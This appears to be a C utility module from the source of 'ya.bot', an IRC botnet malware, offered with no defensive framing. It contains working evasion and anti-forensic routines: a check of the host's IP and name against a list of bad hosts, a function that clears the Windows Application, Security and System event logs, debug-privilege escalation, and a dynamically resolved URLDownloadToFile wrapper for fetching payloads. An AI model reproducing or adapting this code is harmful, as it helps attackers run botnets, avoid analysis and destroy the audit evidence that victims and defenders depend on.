/*  ya.bot  */

#include "bot.h"

bool checkiplist()
{
	char szHostName[128], szIP[16];
	hostent *he;
	int i = 0;
	sockaddr_in sin;
	WSADATA wsadata;

#ifndef NO_DEBUG
		debug_print("Checking for bad IPs and hosts, checkiplist()()");
#endif

	if (WSAStartup(0x0202, &wsadata) != 0)
			return FALSE;		
	if (gethostname(szHostName, sizeof(szHostName) - 1) == SOCKET_ERROR)
	{
			WSACleanup();
			return FALSE;
	}
		he = gethostbyname(szHostName);
	if (!he)
	{
			WSACleanup();
			return FALSE;
	}
		memcpy(&sin.sin_addr, he->h_addr_list[0], he->h_length);
		strncpy(szIP, inet_ntoa(sin.sin_addr), sizeof(szIP) - 1);
	while (badipsandhosts[i])
	{
		if (wcstrcmp(szIP, (char *)badipsandhosts[i]))
		{
				WSACleanup();
				return FALSE;
		}
		else if (wcstrcmp(szHostName, (char *)badipsandhosts[i]))
		{
				WSACleanup();
				return FALSE;
		}
			i++;
	}
		WSACleanup();
		return FALSE;
}

#ifndef NO_CLEARLOGS
void cleareventlogs()
{
	HANDLE hLog;

#ifndef NO_DEBUG
		debug_print("Clearing system logs, clearsystemlogs()");
#endif

		hLog = OpenEventLog(NULL, string_miscclearlogapplication);
		ClearEventLog(hLog, NULL);
		CloseEventLog(hLog);
		hLog = OpenEventLog(NULL, string_miscclearlogsecurity);
		ClearEventLog(hLog, NULL);
		CloseEventLog(hLog);
		hLog = OpenEventLog(NULL, string_miscclearlogsystem);
		ClearEventLog(hLog, NULL);
		CloseEventLog(hLog);
}
#endif

bool getprivileges()
{
	HANDLE hToken;
	LUID lValue; 
	TOKEN_PRIVILEGES pToken;

#ifndef NO_DEBUG
		debug_print("Getting privileges, getprivileges()");
#endif	

		pToken.PrivilegeCount = 1;
		pToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
			CloseHandle(hToken);
			return FALSE;
	} 
		LookupPrivilegeValue(NULL, string_miscdebugprivilege, &lValue);
		pToken.Privileges[0].Luid = lValue;
		AdjustTokenPrivileges(hToken, FALSE, &pToken, sizeof pToken, NULL, NULL);
		LookupPrivilegeValue(NULL, string_miscshutdownprivilege, &lValue);
		pToken.Privileges[0].Luid = lValue;
		AdjustTokenPrivileges(hToken, FALSE, &pToken, sizeof pToken, NULL, NULL);
		CloseHandle(hToken);
		return TRUE;
}

__int64 getuptime()
{
	LARGE_INTEGER s_counter, s_frequency;
		QueryPerformanceCounter(&s_counter);
		QueryPerformanceFrequency(&s_frequency);
		return s_counter.QuadPart / s_frequency.QuadPart; //seconds
//		return ((s_counter.QuadPart / s_frequency.QuadPart) % 3600) / 60; //minutes
//		return (s_counter.QuadPart / s_frequency.QuadPart) / 3600; //hours
//		return (s_counter.QuadPart / s_frequency.QuadPart) / 86400; //days
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by Bob Stout
//http://www.snippets.org/
//botbotbotbotbotbotbotbotbotbotbotbotbot

void *memmem(const void *buf, const void *pattern, size_t buflen, size_t len)
{
	char *bf = (char *)buf, *pt = (char *)pattern;
	size_t i, j;

#ifndef NO_DEBUG
		debug_print("Comparing memory, memmem()");
#endif

	if (len > buflen)
			return (void *)NULL;
	for (i = 0; i <= (buflen - len); ++i)
	{
		for (j = 0; j < len; ++j)
			if (pt[j] != bf[i + j])
				break;
		if (j == len)
				return (bf + i);
	}
		return NULL;
}

char *stristr(const char *str, const char *strSearch)
{
	char *pszSearch, *pszStart, *pszString;
	for (pszStart = (char *)str; *pszStart != NULL; pszStart++)
	{
		for (; ((*pszStart != NULL) && (toupper(*pszStart) != toupper(*strSearch))); pszStart++)
			if (NULL == *pszStart)
					return NULL;
			pszSearch = (char *)strSearch;
			pszString = (char *)pszStart;
		while (toupper(*pszString) == toupper(*pszSearch))
		{
				pszString++;
				pszSearch++;
			if (NULL == *pszSearch)
					return (pszStart);
		}
	}
		return NULL;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code by X-Lock
//botbotbotbotbotbotbotbotbotbotbotbotbot

bool wcstrcmp(char *s, char *w)
{
	int i;
	if (!*s)
	{
		if (!*w)
				return TRUE;
		if (*w == 0x2A)
				return wcstrcmp(s, w + 1);
			return FALSE;
	}
	else if (!*w)
			return FALSE;
	else if (*s == *w)
			return wcstrcmp(s + 1, w + 1);
	else if (*w == 0x3F)
			return wcstrcmp(s + 1, w + 1);
	else if (*w == 0x2A)
	{
		for (i = 0;; i++)
		{
			if (wcstrcmp(s + i, w + 1))
					return TRUE;
			if (!*(s + i))
					return FALSE;
		}
	}
		return FALSE;
}

HRESULT xURLDownloadToFile(char *pszURL, char *pszFileName)
{
	HMODULE hModule;
	typedef HRESULT (WINAPI *pURLDownloadToFile)(DWORD, LPCSTR, LPCSTR, DWORD, DWORD);
	pURLDownloadToFile fURLDownloadToFile;

#ifndef NO_DEBUG
		debug_print("Calling URLDownloadToFile, xURLDownloadToFile()");
#endif

		hModule = LoadLibrary(string_miscurlmonlibrary);
		fURLDownloadToFile = (pURLDownloadToFile)GetProcAddress(hModule,
				string_miscurldownloadfunction);
		return fURLDownloadToFile(0, pszURL, pszFileName, 0, 0);
}